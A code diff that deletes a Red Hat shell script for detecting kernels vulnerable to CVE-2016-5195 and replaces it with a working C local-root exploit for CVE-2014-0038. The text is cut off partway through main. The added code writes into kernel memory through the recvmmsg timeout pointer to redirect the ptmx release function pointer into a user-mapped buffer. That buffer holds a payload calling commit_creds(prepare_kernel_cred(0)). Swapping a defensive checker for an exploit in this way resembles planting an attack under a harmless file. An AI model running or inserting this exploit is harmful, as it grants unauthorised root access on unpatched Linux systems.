@@ -1,631 +1,200 @@
-RED="\033[1;31m"
-YELLOW="\033[1;33m"
-GREEN="\033[1;32m"
-BOLD="\033[1m"
-RESET="\033[0m"
+/*
+ * Local root exploit for CVE-2014-0038.
+ *
+ * https://raw.github.com/saelo/cve-2014-0038/master/timeoutpwn.c
+ *
+ * Bug: The X86_X32 recvmmsg syscall does not properly sanitize the timeout pointer
+ * passed from userspace.
+ *
+ * Exploit primitive: Pass a pointer to a kernel address as timeout for recvmmsg,
+ * if the original byte at that address is known it can be overwritten
+ * with known data.
+ * If the least significant byte is 0xff, waiting 255 seconds will turn it into a 0x00.
+ *
+ * Restrictions: The first long at the passed address (tv_sec) has to be positive
+ * and the second long (tv_nsec) has to be smaller than 1000000000.
+ *
+ * Overview: Target the release function pointer of the ptmx_fops structure located in
+ * non initialized (and thus writable) kernel memory. Zero out the three most
+ * significant bytes and thus turn it into a pointer to an address mappable in
+ * user space.
+ * The release pointer is used as it is followed by 16 0x00 bytes (so the tv_nsec
+ * is valid).
+ * Open /dev/ptmx, close it and enjoy.
+ *
+ * Not very beautiful but should be fairly reliable if symbols can be resolved.
+ *
+ * Tested on Ubuntu 13.10
+ *
+ * gcc timeoutpwn.c -o pwn && ./pwn
+ *
+ * Written by saelo
+ */
+#define _GNU_SOURCE
+#include <netinet/ip.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/wait.h>
+#include <sys/mman.h>
 
-SAFE_KERNEL="SAFE_KERNEL"
-SAFE_KPATCH="SAFE_KPATCH"
-MITIGATED="MITIGATED"
-VULNERABLE="VULNERABLE"
+#define __X32_SYSCALL_BIT 0x40000000
+#undef __NR_recvmmsg
+#define __NR_recvmmsg (__X32_SYSCALL_BIT + 537)
 
-MITIGATION_ON='CVE-2016-5195 mitigation loaded'
-MITIGATION_OFF='CVE-2016-5195 mitigation unloaded'
+#define BUFSIZE 200
+#define PAYLOADSIZE 0x2000
+#define FOPS_RELEASE_OFFSET 13*8
 
+/*
+ * Adapt these addresses for your need.
+ * see /boot/System.map* or /proc/kallsyms
+ * These are the offsets from ubuntu 3.11.0-12-generic.
+ */
+#define PTMX_FOPS           0xffffffff81fb30c0LL
+#define TTY_RELEASE         0xffffffff8142fec0LL
+#define COMMIT_CREDS        0xffffffff8108ad40LL
+#define PREPARE_KERNEL_CRED 0xffffffff8108b010LL
 
-VULNERABLE_VERSIONS=(
-    # RHEL5
-    "2.6.18-8.1.1.el5"
-    "2.6.18-8.1.3.el5"
-    "2.6.18-8.1.4.el5"
-    "2.6.18-8.1.6.el5"
-    "2.6.18-8.1.8.el5"
-    "2.6.18-8.1.10.el5"
-    "2.6.18-8.1.14.el5"
-    "2.6.18-8.1.15.el5"
-    "2.6.18-53.el5"
-    "2.6.18-53.1.4.el5"
-    "2.6.18-53.1.6.el5"
-    "2.6.18-53.1.13.el5"
-    "2.6.18-53.1.14.el5"
-    "2.6.18-53.1.19.el5"
-    "2.6.18-53.1.21.el5"
-    "2.6.18-92.el5"
-    "2.6.18-92.1.1.el5"
-    "2.6.18-92.1.6.el5"
-    "2.6.18-92.1.10.el5"
-    "2.6.18-92.1.13.el5"
-    "2.6.18-92.1.18.el5"
-    "2.6.18-92.1.22.el5"
-    "2.6.18-92.1.24.el5"
-    "2.6.18-92.1.26.el5"
-    "2.6.18-92.1.27.el5"
-    "2.6.18-92.1.28.el5"
-    "2.6.18-92.1.29.el5"
-    "2.6.18-92.1.32.el5"
-    "2.6.18-92.1.35.el5"
-    "2.6.18-92.1.38.el5"
-    "2.6.18-128.el5"
-    "2.6.18-128.1.1.el5"
-    "2.6.18-128.1.6.el5"
-    "2.6.18-128.1.10.el5"
-    "2.6.18-128.1.14.el5"
-    "2.6.18-128.1.16.el5"
-    "2.6.18-128.2.1.el5"
-    "2.6.18-128.4.1.el5"
-    "2.6.18-128.4.1.el5"
-    "2.6.18-128.7.1.el5"
-    "2.6.18-128.8.1.el5"
-    "2.6.18-128.11.1.el5"
-    "2.6.18-128.12.1.el5"
-    "2.6.18-128.14.1.el5"
-    "2.6.18-128.16.1.el5"
-    "2.6.18-128.17.1.el5"
-    "2.6.18-128.18.1.el5"
-    "2.6.18-128.23.1.el5"
-    "2.6.18-128.23.2.el5"
-    "2.6.18-128.25.1.el5"
-    "2.6.18-128.26.1.el5"
-    "2.6.18-128.27.1.el5"
-    "2.6.18-128.29.1.el5"
-    "2.6.18-128.30.1.el5"
-    "2.6.18-128.31.1.el5"
-    "2.6.18-128.32.1.el5"
-    "2.6.18-128.35.1.el5"
-    "2.6.18-128.36.1.el5"
-    "2.6.18-128.37.1.el5"
-    "2.6.18-128.38.1.el5"
-    "2.6.18-128.39.1.el5"
-    "2.6.18-128.40.1.el5"
-    "2.6.18-128.41.1.el5"
-    "2.6.18-164.el5"
-    "2.6.18-164.2.1.el5"
-    "2.6.18-164.6.1.el5"
-    "2.6.18-164.9.1.el5"
-    "2.6.18-164.10.1.el5"
-    "2.6.18-164.11.1.el5"
-    "2.6.18-164.15.1.el5"
-    "2.6.18-164.17.1.el5"
-    "2.6.18-164.19.1.el5"
-    "2.6.18-164.21.1.el5"
-    "2.6.18-164.25.1.el5"
-    "2.6.18-164.25.2.el5"
-    "2.6.18-164.28.1.el5"
-    "2.6.18-164.30.1.el5"
-    "2.6.18-164.32.1.el5"
-    "2.6.18-164.34.1.el5"
-    "2.6.18-164.36.1.el5"
-    "2.6.18-164.37.1.el5"
-    "2.6.18-164.38.1.el5"
-    "2.6.18-194.el5"
-    "2.6.18-194.3.1.el5"
-    "2.6.18-194.8.1.el5"
-    "2.6.18-194.11.1.el5"
-    "2.6.18-194.11.3.el5"
-    "2.6.18-194.11.4.el5"
-    "2.6.18-194.17.1.el5"
-    "2.6.18-194.17.4.el5"
-    "2.6.18-194.26.1.el5"
-    "2.6.18-194.32.1.el5"
-    "2.6.18-238.el5"
-    "2.6.18-238.1.1.el5"
-    "2.6.18-238.5.1.el5"
-    "2.6.18-238.9.1.el5"
-    "2.6.18-238.12.1.el5"
-    "2.6.18-238.19.1.el5"
-    "2.6.18-238.21.1.el5"
-    "2.6.18-238.27.1.el5"
-    "2.6.18-238.28.1.el5"
-    "2.6.18-238.31.1.el5"
-    "2.6.18-238.33.1.el5"
-    "2.6.18-238.35.1.el5"
-    "2.6.18-238.37.1.el5"
-    "2.6.18-238.39.1.el5"
-    "2.6.18-238.40.1.el5"
-    "2.6.18-238.44.1.el5"
-    "2.6.18-238.45.1.el5"
-    "2.6.18-238.47.1.el5"
-    "2.6.18-238.48.1.el5"
-    "2.6.18-238.49.1.el5"
-    "2.6.18-238.50.1.el5"
-    "2.6.18-238.51.1.el5"
-    "2.6.18-238.52.1.el5"
-    "2.6.18-238.53.1.el5"
-    "2.6.18-238.54.1.el5"
-    "2.6.18-238.55.1.el5"
-    "2.6.18-238.56.1.el5"
-    "2.6.18-274.el5"
-    "2.6.18-274.3.1.el5"
-    "2.6.18-274.7.1.el5"
-    "2.6.18-274.12.1.el5"
-    "2.6.18-274.17.1.el5"
-    "2.6.18-274.18.1.el5"
-    "2.6.18-308.el5"
-    "2.6.18-308.1.1.el5"
-    "2.6.18-308.4.1.el5"
-    "2.6.18-308.8.1.el5"
-    "2.6.18-308.8.2.el5"
-    "2.6.18-308.11.1.el5"
-    "2.6.18-308.13.1.el5"
-    "2.6.18-308.16.1.el5"
-    "2.6.18-308.20.1.el5"
-    "2.6.18-308.24.1.el5"
-    "2.6.18-348.el5"
-    "2.6.18-348.1.1.el5"
-    "2.6.18-348.2.1.el5"
-    "2.6.18-348.3.1.el5"
-    "2.6.18-348.4.1.el5"
-    "2.6.18-348.6.1.el5"
-    "2.6.18-348.12.1.el5"
-    "2.6.18-348.16.1.el5"
-    "2.6.18-348.18.1.el5"
-    "2.6.18-348.19.1.el5"
-    "2.6.18-348.21.1.el5"
-    "2.6.18-348.22.1.el5"
-    "2.6.18-348.23.1.el5"
-    "2.6.18-348.25.1.el5"
-    "2.6.18-348.27.1.el5"
-    "2.6.18-348.28.1.el5"
-    "2.6.18-348.29.1.el5"
-    "2.6.18-348.30.1.el5"
-    "2.6.18-348.31.2.el5"
-    "2.6.18-371.el5"
-    "2.6.18-371.1.2.el5"
-    "2.6.18-371.3.1.el5"
-    "2.6.18-371.4.1.el5"
-    "2.6.18-371.6.1.el5"
-    "2.6.18-371.8.1.el5"
-    "2.6.18-371.9.1.el5"
-    "2.6.18-371.11.1.el5"
-    "2.6.18-371.12.1.el5"
-    "2.6.18-398.el5"
-    "2.6.18-400.el5"
-    "2.6.18-400.1.1.el5"
-    "2.6.18-402.el5"
-    "2.6.18-404.el5"
-    "2.6.18-406.el5"
-    "2.6.18-407.el5"
-    "2.6.18-408.el5"
-    "2.6.18-409.el5"
-    "2.6.18-410.el5"
-    "2.6.18-411.el5"
-    "2.6.18-412.el5"
+typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
+typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
 
-    # RHEL6
-    "2.6.32-71.7.1.el6"
-    "2.6.32-71.14.1.el6"
-    "2.6.32-71.18.1.el6"
-    "2.6.32-71.18.2.el6"
-    "2.6.32-71.24.1.el6"
-    "2.6.32-71.29.1.el6"
-    "2.6.32-71.31.1.el6"
-    "2.6.32-71.34.1.el6"
-    "2.6.32-71.35.1.el6"
-    "2.6.32-71.36.1.el6"
-    "2.6.32-71.37.1.el6"
-    "2.6.32-71.38.1.el6"
-    "2.6.32-71.39.1.el6"
-    "2.6.32-71.40.1.el6"
-    "2.6.32-131.0.15.el6"
-    "2.6.32-131.2.1.el6"
-    "2.6.32-131.4.1.el6"
-    "2.6.32-131.6.1.el6"
-    "2.6.32-131.12.1.el6"
-    "2.6.32-131.17.1.el6"
-    "2.6.32-131.21.1.el6"
-    "2.6.32-131.22.1.el6"
-    "2.6.32-131.25.1.el6"
-    "2.6.32-131.26.1.el6"
-    "2.6.32-131.28.1.el6"
-    "2.6.32-131.29.1.el6"
-    "2.6.32-131.30.1.el6"
-    "2.6.32-131.30.2.el6"
-    "2.6.32-131.33.1.el6"
-    "2.6.32-131.35.1.el6"
-    "2.6.32-131.36.1.el6"
-    "2.6.32-131.37.1.el6"
-    "2.6.32-131.38.1.el6"
-    "2.6.32-131.39.1.el6"
-    "2.6.32-220.el6"
-    "2.6.32-220.2.1.el6"
-    "2.6.32-220.4.1.el6"
-    "2.6.32-220.4.2.el6"
-    "2.6.32-220.4.7.bgq.el6"
-    "2.6.32-220.7.1.el6"
-    "2.6.32-220.7.3.p7ih.el6"
-    "2.6.32-220.7.4.p7ih.el6"
-    "2.6.32-220.7.6.p7ih.el6"
-    "2.6.32-220.7.7.p7ih.el6"
-    "2.6.32-220.13.1.el6"
-    "2.6.32-220.17.1.el6"
-    "2.6.32-220.23.1.el6"
-    "2.6.32-220.24.1.el6"
-    "2.6.32-220.25.1.el6"
-    "2.6.32-220.26.1.el6"
-    "2.6.32-220.28.1.el6"
-    "2.6.32-220.30.1.el6"
-    "2.6.32-220.31.1.el6"
-    "2.6.32-220.32.1.el6"
-    "2.6.32-220.34.1.el6"
-    "2.6.32-220.34.2.el6"
-    "2.6.32-220.38.1.el6"
-    "2.6.32-220.39.1.el6"
-    "2.6.32-220.41.1.el6"
-    "2.6.32-220.42.1.el6"
-    "2.6.32-220.45.1.el6"
-    "2.6.32-220.46.1.el6"
-    "2.6.32-220.48.1.el6"
-    "2.6.32-220.51.1.el6"
-    "2.6.32-220.52.1.el6"
-    "2.6.32-220.53.1.el6"
-    "2.6.32-220.54.1.el6"
-    "2.6.32-220.55.1.el6"
-    "2.6.32-220.56.1.el6"
-    "2.6.32-220.57.1.el6"
-    "2.6.32-220.58.1.el6"
-    "2.6.32-220.60.2.el6"
-    "2.6.32-220.62.1.el6"
-    "2.6.32-220.63.2.el6"
-    "2.6.32-220.64.1.el6"
-    "2.6.32-220.65.1.el6"
-    "2.6.32-220.66.1.el6"
-    "2.6.32-220.67.1.el6"
-    "2.6.32-279.el6"
-    "2.6.32-279.1.1.el6"
-    "2.6.32-279.2.1.el6"
-    "2.6.32-279.5.1.el6"
-    "2.6.32-279.5.2.el6"
-    "2.6.32-279.9.1.el6"
-    "2.6.32-279.11.1.el6"
-    "2.6.32-279.14.1.bgq.el6"
-    "2.6.32-279.14.1.el6"
-    "2.6.32-279.19.1.el6"
-    "2.6.32-279.22.1.el6"
-    "2.6.32-279.23.1.el6"
-    "2.6.32-279.25.1.el6"
-    "2.6.32-279.25.2.el6"
-    "2.6.32-279.31.1.el6"
-    "2.6.32-279.33.1.el6"
-    "2.6.32-279.34.1.el6"
-    "2.6.32-279.37.2.el6"
-    "2.6.32-279.39.1.el6"
-    "2.6.32-279.41.1.el6"
-    "2.6.32-279.42.1.el6"
-    "2.6.32-279.43.1.el6"
-    "2.6.32-279.43.2.el6"
-    "2.6.32-279.46.1.el6"
-    "2.6.32-358.el6"
-    "2.6.32-358.0.1.el6"
-    "2.6.32-358.2.1.el6"
-    "2.6.32-358.6.1.el6"
-    "2.6.32-358.6.2.el6"
-    "2.6.32-358.6.3.p7ih.el6"
-    "2.6.32-358.11.1.bgq.el6"
-    "2.6.32-358.11.1.el6"
-    "2.6.32-358.14.1.el6"
-    "2.6.32-358.18.1.el6"
-    "2.6.32-358.23.2.el6"
-    "2.6.32-358.28.1.el6"
-    "2.6.32-358.32.3.el6"
-    "2.6.32-358.37.1.el6"
-    "2.6.32-358.41.1.el6"
-    "2.6.32-358.44.1.el6"
-    "2.6.32-358.46.1.el6"
-    "2.6.32-358.46.2.el6"
-    "2.6.32-358.48.1.el6"
-    "2.6.32-358.49.1.el6"
-    "2.6.32-358.51.1.el6"
-    "2.6.32-358.51.2.el6"
-    "2.6.32-358.55.1.el6"
-    "2.6.32-358.56.1.el6"
-    "2.6.32-358.59.1.el6"
-    "2.6.32-358.61.1.el6"
-    "2.6.32-358.62.1.el6"
-    "2.6.32-358.65.1.el6"
-    "2.6.32-358.67.1.el6"
-    "2.6.32-358.68.1.el6"
-    "2.6.32-358.69.1.el6"
-    "2.6.32-358.70.1.el6"
-    "2.6.32-358.71.1.el6"
-    "2.6.32-358.72.1.el6"
-    "2.6.32-358.73.1.el6"
-    "2.6.32-358.111.1.openstack.el6"
-    "2.6.32-358.114.1.openstack.el6"
-    "2.6.32-358.118.1.openstack.el6"
-    "2.6.32-358.123.4.openstack.el6"
-    "2.6.32-431.el6"
-    "2.6.32-431.1.1.bgq.el6"
-    "2.6.32-431.1.2.el6"
-    "2.6.32-431.3.1.el6"
-    "2.6.32-431.5.1.el6"
-    "2.6.32-431.11.2.el6"
-    "2.6.32-431.17.1.el6"
-    "2.6.32-431.20.3.el6"
-    "2.6.32-431.20.5.el6"
-    "2.6.32-431.23.3.el6"
-    "2.6.32-431.29.2.el6"
-    "2.6.32-431.37.1.el6"
-    "2.6.32-431.40.1.el6"
-    "2.6.32-431.40.2.el6"
-    "2.6.32-431.46.2.el6"
-    "2.6.32-431.50.1.el6"
-    "2.6.32-431.53.2.el6"
-    "2.6.32-431.56.1.el6"
-    "2.6.32-431.59.1.el6"
-    "2.6.32-431.61.2.el6"
-    "2.6.32-431.64.1.el6"
-    "2.6.32-431.66.1.el6"
-    "2.6.32-431.68.1.el6"
-    "2.6.32-431.69.1.el6"
-    "2.6.32-431.70.1.el6"
-    "2.6.32-431.71.1.el6"
-    "2.6.32-431.72.1.el6"
-    "2.6.32-431.73.2.el6"
-    "2.6.32-431.74.1.el6"
-    "2.6.32-504.el6"
-    "2.6.32-504.1.3.el6"
-    "2.6.32-504.3.3.el6"
-    "2.6.32-504.8.1.el6"
-    "2.6.32-504.8.2.bgq.el6"
-    "2.6.32-504.12.2.el6"
-    "2.6.32-504.16.2.el6"
-    "2.6.32-504.23.4.el6"
-    "2.6.32-504.30.3.el6"
-    "2.6.32-504.30.5.p7ih.el6"
-    "2.6.32-504.33.2.el6"
-    "2.6.32-504.36.1.el6"
-    "2.6.32-504.38.1.el6"
-    "2.6.32-504.40.1.el6"
-    "2.6.32-504.43.1.el6"
-    "2.6.32-504.46.1.el6"
-    "2.6.32-504.49.1.el6"
-    "2.6.32-504.50.1.el6"
-    "2.6.32-504.51.1.el6"
-    "2.6.32-504.52.1.el6"
-    "2.6.32-573.el6"
-    "2.6.32-573.1.1.el6"
-    "2.6.32-573.3.1.el6"
-    "2.6.32-573.4.2.bgq.el6"
-    "2.6.32-573.7.1.el6"
-    "2.6.32-573.8.1.el6"
-    "2.6.32-573.12.1.el6"
-    "2.6.32-573.18.1.el6"
-    "2.6.32-573.22.1.el6"
-    "2.6.32-573.26.1.el6"
-    "2.6.32-573.30.1.el6"
-    "2.6.32-573.32.1.el6"
-    "2.6.32-573.34.1.el6"
-    "2.6.32-573.35.1.el6"
-    "2.6.32-642.el6"
-    "2.6.32-642.1.1.el6"
-    "2.6.32-642.3.1.el6"
-    "2.6.32-642.4.2.el6"
-    "2.6.32-642.6.1.el6"
+/*
+ * Match signature of int release(struct inode*, struct file*).
+ *
+ * See here: http://grsecurity.net/~spender/exploits/enlightenment.tgz
+ */
+int __attribute__((regparm(3)))
+kernel_payload(void* foo, void* bar)
+{
+    _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
+    _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;
 
-    # RHEL7
-    "3.10.0-123.el7"
-    "3.10.0-123.1.2.el7"
-    "3.10.0-123.4.2.el7"
-    "3.10.0-123.4.4.el7"
-    "3.10.0-123.6.3.el7"
-    "3.10.0-123.8.1.el7"
-    "3.10.0-123.9.2.el7"
-    "3.10.0-123.9.3.el7"
-    "3.10.0-123.13.1.el7"
-    "3.10.0-123.13.2.el7"
-    "3.10.0-123.20.1.el7"
-    "3.10.0-229.el7"
-    "3.10.0-229.1.2.el7"
-    "3.10.0-229.4.2.el7"
-    "3.10.0-229.7.2.el7"
-    "3.10.0-229.11.1.el7"
-    "3.10.0-229.14.1.el7"
-    "3.10.0-229.20.1.el7"
-    "3.10.0-229.24.2.el7"
-    "3.10.0-229.26.2.el7"
-    "3.10.0-229.28.1.el7"
-    "3.10.0-229.30.1.el7"
-    "3.10.0-229.34.1.el7"
-    "3.10.0-229.38.1.el7"
-    "3.10.0-229.40.1.el7"
-    "3.10.0-229.42.1.el7"
-    "3.10.0-327.el7"
-    "3.10.0-327.3.1.el7"
-    "3.10.0-327.4.4.el7"
-    "3.10.0-327.4.5.el7"
-    "3.10.0-327.10.1.el7"
-    "3.10.0-327.13.1.el7"
-    "3.10.0-327.18.2.el7"
-    "3.10.0-327.22.2.el7"
-    "3.10.0-327.28.2.el7"
-    "3.10.0-327.28.3.el7"
-    "3.10.0-327.36.1.el7"
-    "3.10.0-327.36.2.el7"
-    "3.10.0-229.1.2.ael7b"
-    "3.10.0-229.4.2.ael7b"
-    "3.10.0-229.7.2.ael7b"
-    "3.10.0-229.11.1.ael7b"
-    "3.10.0-229.14.1.ael7b"
-    "3.10.0-229.20.1.ael7b"
-    "3.10.0-229.24.2.ael7b"
-    "3.10.0-229.26.2.ael7b"
-    "3.10.0-229.28.1.ael7b"
-    "3.10.0-229.30.1.ael7b"
-    "3.10.0-229.34.1.ael7b"
-    "3.10.0-229.38.1.ael7b"
-    "3.10.0-229.40.1.ael7b"
-    "3.10.0-229.42.1.ael7b"
-    "4.2.0-0.21.el7"
+    *((int*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 4)) = -1;    // restore pointer
+    commit_creds(prepare_kernel_cred(0));
 
-    # RHEL5
-    "2.6.24.7-74.el5rt"
-    "2.6.24.7-81.el5rt"
-    "2.6.24.7-93.el5rt"
-    "2.6.24.7-101.el5rt"
-    "2.6.24.7-108.el5rt"
-    "2.6.24.7-111.el5rt"
-    "2.6.24.7-117.el5rt"
-    "2.6.24.7-126.el5rt"
-    "2.6.24.7-132.el5rt"
-    "2.6.24.7-137.el5rt"
-    "2.6.24.7-139.el5rt"
-    "2.6.24.7-146.el5rt"
-    "2.6.24.7-149.el5rt"
-    "2.6.24.7-161.el5rt"
-    "2.6.24.7-169.el5rt"
-    "2.6.33.7-rt29.45.el5rt"
-    "2.6.33.7-rt29.47.el5rt"
-    "2.6.33.7-rt29.55.el5rt"
-    "2.6.33.9-rt31.64.el5rt"
-    "2.6.33.9-rt31.67.el5rt"
-    "2.6.33.9-rt31.86.el5rt"
+    return -1;
+}
 
-    # RHEL6
-    "2.6.33.9-rt31.66.el6rt"
-    "2.6.33.9-rt31.74.el6rt"
-    "2.6.33.9-rt31.75.el6rt"
-    "2.6.33.9-rt31.79.el6rt"
-    "3.0.9-rt26.45.el6rt"
-    "3.0.9-rt26.46.el6rt"
-    "3.0.18-rt34.53.el6rt"
-    "3.0.25-rt44.57.el6rt"
-    "3.0.30-rt50.62.el6rt"
-    "3.0.36-rt57.66.el6rt"
-    "3.2.23-rt37.56.el6rt"
-    "3.2.33-rt50.66.el6rt"
-    "3.6.11-rt28.20.el6rt"
-    "3.6.11-rt30.25.el6rt"
-    "3.6.11.2-rt33.39.el6rt"
-    "3.6.11.5-rt37.55.el6rt"
-    "3.8.13-rt14.20.el6rt"
-    "3.8.13-rt14.25.el6rt"
-    "3.8.13-rt27.33.el6rt"
-    "3.8.13-rt27.34.el6rt"
-    "3.8.13-rt27.40.el6rt"
-    "3.10.0-229.rt56.144.el6rt"
-    "3.10.0-229.rt56.147.el6rt"
-    "3.10.0-229.rt56.149.el6rt"
-    "3.10.0-229.rt56.151.el6rt"
-    "3.10.0-229.rt56.153.el6rt"
-    "3.10.0-229.rt56.158.el6rt"
-    "3.10.0-229.rt56.161.el6rt"
-    "3.10.0-229.rt56.162.el6rt"
-    "3.10.0-327.rt56.170.el6rt"
-    "3.10.0-327.rt56.171.el6rt"
-    "3.10.0-327.rt56.176.el6rt"
-    "3.10.0-327.rt56.183.el6rt"
-    "3.10.0-327.rt56.190.el6rt"
-    "3.10.0-327.rt56.194.el6rt"
-    "3.10.0-327.rt56.195.el6rt"
-    "3.10.0-327.rt56.197.el6rt"
-    "3.10.33-rt32.33.el6rt"
-    "3.10.33-rt32.34.el6rt"
-    "3.10.33-rt32.43.el6rt"
-    "3.10.33-rt32.45.el6rt"
-    "3.10.33-rt32.51.el6rt"
-    "3.10.33-rt32.52.el6rt"
-    "3.10.58-rt62.58.el6rt"
-    "3.10.58-rt62.60.el6rt"
+/*
+ * Write a zero to the byte at then given address.
+ * Only works if the current value is 0xff.
+ */
+void zero_out(long addr)
+{
+    int sockfd, retval, port, pid, i;
+    struct sockaddr_in sa;
+    char buf[BUFSIZE];
+    struct mmsghdr msgs;
+    struct iovec iovecs;
 
-    # RHEL7
-    "3.10.0-229.rt56.141.el7"
-    "3.10.0-229.1.2.rt56.141.2.el7_1"
-    "3.10.0-229.4.2.rt56.141.6.el7_1"
-    "3.10.0-229.7.2.rt56.141.6.el7_1"
-    "3.10.0-229.11.1.rt56.141.11.el7_1"
-    "3.10.0-229.14.1.rt56.141.13.el7_1"
-    "3.10.0-229.20.1.rt56.141.14.el7_1"
-    "3.10.0-229.rt56.141.el7"
-    "3.10.0-327.rt56.204.el7"
-    "3.10.0-327.4.5.rt56.206.el7_2"
-    "3.10.0-327.10.1.rt56.211.el7_2"
-    "3.10.0-327.13.1.rt56.216.el7_2"
-    "3.10.0-327.18.2.rt56.223.el7_2"
-    "3.10.0-327.22.2.rt56.230.el7_2"
-    "3.10.0-327.28.2.rt56.234.el7_2"
-    "3.10.0-327.28.3.rt56.235.el7"
-    "3.10.0-327.36.1.rt56.237.el7"
-)
+    srand(time(NULL));
 
-KPATCH_MODULE_NAMES=(
-    "kpatch_3_10_0_327_36_1_1_1"
-    "kpatch_3_10_0_327_36_2_1_1"
-    "kpatch_3_10_0_229_4_2_1_1"
-    "kpatch_3_10_0_327_28_3_1_1"
-    "kpatch_3_10_0_327_28_2_1_1"
-    "kpatch_3_10_0_327_13_1_1_1"
-    "kpatch_3_10_0_327_10_1_1_2"
-    "kpatch_3_10_0_327_4_5_1_1"
-    "kpatch_3_10_0_229_14_1_1_1"
-    "kpatch_3_10_0_229_42_1_1_1"
-    "kpatch_3_10_0_327_22_2_1_2"
-    "kpatch_3_10_0_327_10_1_1_1"
-)
+    port = 1024 + (rand() % (0x10000 - 1024));
 
-running_kernel=$( uname -r )
+    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sockfd == -1) {
+        perror("socket()");
+        exit(EXIT_FAILURE);
+    }
 
-# Check supported platform
-if [[ "$running_kernel" != *".el"[5-7]* ]]; then
-    echo -e "${RED}This script is only meant to detect vulnerable kernels on Red Hat Enterprise Linux 5, 6 and 7.${RESET}"
-    exit 4
-fi
+    sa.sin_family      = AF_INET;
+    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+    sa.sin_port        = htons(port);
+    if (bind(sockfd, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
+        perror("bind()");
+        exit(EXIT_FAILURE);
+    }
 
-# Check kernel if it is vulnerable
-for tested_kernel in "${VULNERABLE_VERSIONS[@]}"; do
-	if [[ "$running_kernel" == *"$tested_kernel"* ]]; then
-	    vulnerable_kernel=${running_kernel}
-	    break
-	fi
-done
+    memset(&msgs, 0, sizeof(msgs));
+    iovecs.iov_base         = buf;
+    iovecs.iov_len          = BUFSIZE;
+    msgs.msg_hdr.msg_iov    = &iovecs;
+    msgs.msg_hdr.msg_iovlen = 1;
 
-# Check if kpatch is installed
-modules=$( lsmod )
-for tested_kpatch in "${KPATCH_MODULE_NAMES[@]}"; do
-    if [[ "$modules" == *"$tested_kpatch"* ]]; then
-	    applied_kpatch=${tested_kpatch}
-	    break
-	fi
-done
+    /*
+     * start a seperate process to send a udp message after 255 seconds so the syscall returns,
+     * but not after updating the timout struct and writing the remaining time into it.
+     * 0xff - 255 seconds = 0x00
+     */
+    printf("clearing byte at 0x%lx\n", addr);
+    pid = fork();
+    if (pid == 0) {
+        memset(buf, 0x41, BUFSIZE);
 
-# Check mitigation
-mitigated=0
-while read -r line; do
-    if [[ "$line" == *"$MITIGATION_ON"* ]]; then
-        mitigated=1
-    elif [[ "$line" == *"$MITIGATION_OFF"* ]]; then
-        mitigated=0
-    fi
-done < <( dmesg )
+        if ((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
+            perror("socket()");
+            exit(EXIT_FAILURE);
+        }
 
-# Result interpretation
-result=${VULNERABLE}
-if (( mitigated )); then
-    result=${MITIGATED}
-fi
-if [[ ! "$vulnerable_kernel" ]]; then
-    result=${SAFE_KERNEL}
-elif [[ "$applied_kpatch" ]]; then
-    result=${SAFE_KPATCH}
-fi
+        sa.sin_family      = AF_INET;
+        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+        sa.sin_port        = htons(port);
 
-# Print result
-if [[ ${result} == "$SAFE_KERNEL" ]]; then
-    echo -e "${GREEN}Your kernel is ${RESET}$running_kernel${GREEN} which is NOT vulnerable.${RESET}"
-    exit 0
-elif [[ ${result} == "$SAFE_KPATCH" ]]; then
-    echo -e "Your kernel is $running_kernel which is normally vulnerable."
-    echo -e "${GREEN}However, you have kpatch ${RESET}$applied_kpatch${GREEN} applied, which fixes the vulnerability.${RESET}"
-    exit 1
-elif [[ ${result} == "$MITIGATED" ]]; then
-    echo -e "${YELLOW}Your kernel is ${RESET}$running_kernel${YELLOW} which IS vulnerable.${RESET}"
-    echo -e "${YELLOW}You have a partial mitigation applied.${RESET}"
-    echo -e "This mitigation protects against most common attack vectors which are already exploited in the wild,"
-    echo -e "but does not protect against all possible attack vectors."
-    echo -e "Red Hat recommends that you update your kernel as soon as possible."
-    exit 2
-else
-    echo -e "${RED}Your kernel is ${RESET}$running_kernel${RED} which IS vulnerable.${RESET}"
-    echo -e "Red Hat recommends that you update your kernel. Alternatively, you can apply partial"
-    echo -e "mitigation described at https://access.redhat.com/security/vulnerabilities/2706661 ."
-    exit 3
-fi
+        printf("waiting 255 seconds...\n");
+        for (i = 0; i < 255; i++) {
+        if (i % 10 == 0)
+                printf("%is/255s\n", i);
+        sleep(1);
+        }
+
+        printf("waking up parent...\n");
+        sendto(sockfd, buf, BUFSIZE, 0, &sa, sizeof(sa));
+        exit(EXIT_SUCCESS);
+    } else if (pid > 0) {
+        retval = syscall(__NR_recvmmsg, sockfd, &msgs, 1, 0, (void*)addr);
+        if (retval == -1) {
+            printf("address can't be written to, not a valid timespec struct\n");
+            exit(EXIT_FAILURE);
+        }
+        waitpid(pid, 0, 0);
+        printf("byte zeroed out\n");
+    } else {
+      perror("fork()");
+      exit(EXIT_FAILURE);
+    }
+}
+
+int main(int argc, char** argv)
+{
+    long code, target;
+    int pwn;
+
+    /* Prepare payload... */
+    printf("preparing payload buffer...\n");
+    code = (long)mmap((void*)(TTY_RELEASE & 0x000000fffffff000LL), PAYLOADSIZE, 7, 0x32, 0, 0);
+    memset((void*)code, 0x90, PAYLOADSIZE);
+    code += PAYLOADSIZE - 1024;
+    memcpy((void*)code, &kernel_payload, 1024);
+
+    /*
+     * Now clear the three most significant bytes of the fops pointer
+     * to the release function.
+     * This will make it point into the memory region mapped above.
+     */
+    printf("changing kernel pointer to point into controlled buffer...\n");
+    target = PTMX_FOPS + FOPS_RELEASE_OFFSET;
+    zero_out(target + 7);
+    zero_out(target + 6);
+    zero_out(target + 5);
+
+    /* ... and trigger. */
+    printf("releasing file descriptor to call manipulated pointer in kernel mode...\n");
+    pwn = open("/dev/ptmx", 'r');
+    close(pwn);
+
+    if (getuid() != 0) {
